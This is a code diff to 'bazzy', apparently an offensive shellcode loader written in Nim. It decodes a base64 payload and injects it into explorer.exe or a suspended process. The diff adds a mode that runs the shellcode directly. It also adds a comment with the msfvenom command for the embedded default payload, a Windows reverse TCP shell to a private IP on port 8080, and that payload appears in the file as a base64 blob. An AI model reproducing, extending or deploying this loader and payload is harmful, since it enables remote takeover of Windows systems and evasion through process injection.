@@ -157,10 +157,12 @@ Options:
     -h, --help                Show this help
     -p, --payload <base64>    Base64 encoded shellcode payload
     -t, --target <process>    Target process name (default: explorer.exe)
+    -e, --execute            Execute shellcode directly (no process injection)
     
 Examples:
     bazzy --payload <base64string>                 # Inject into explorer.exe
     bazzy -p <base64string> -t notepad.exe        # Inject into suspended notepad.exe
+    bazzy -p <base64string> -e                    # Execute shellcode directly
     """
     quit(0)
 
@@ -168,6 +170,7 @@ Examples:
 var 
     payload = ""
     targetProcess = ""
+    executeMode = false
     processId: DWORD
     procHandle: HANDLE
     threadHandle: HANDLE
@@ -188,11 +191,13 @@ while true:
         of "target", "t":
             p.next()
             targetProcess = p.key
+        of "execute", "e":
+            executeMode = true
     of cmdArgument:
         echo "Unknown argument: ", p.key
         showHelp()
 
-# If no payload provided, use default
+# If no payload provided, use default: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.142.128 LPORT=8080 -f raw -o reverse.bin
 if payload == "":
     payload = """/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHB
 yQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHW
@@ -207,11 +212,14 @@ idr/1Q=="""
 let decodedData = decode(payload)
 echo "decoded:", decodedData
 echo decodedData.len
-var buf: array[1642, byte]
+var buf: array[1642, byte] #If you aren't using msfvenom payloads you will probably need to modify the size here
 copyMem(unsafeAddr(buf[0]), unsafeAddr(decodedData[0]), decodedData.len)
 
 # Process injection logic
-if targetProcess != "":
+if executeMode:
+    echo ".oO Executing shellcode directly Oo."
+    executeShellcode(buf)
+elif targetProcess != "":
     # Use suspended process injection
     let csp = createSuspendedProcess(
         targetProcess,
@@ -233,7 +241,7 @@ if targetProcess != "":
         echo ".oO Resuming process Oo."
 
         discard resumeThread(threadHandle)
-else:
+elif not executeMode:  # explicitly check we're not in execute mode
     # Default to explorer.exe injection
     echo ".oO Defaulting to explorer.exe injection Oo."
     injectShellcode(buf)
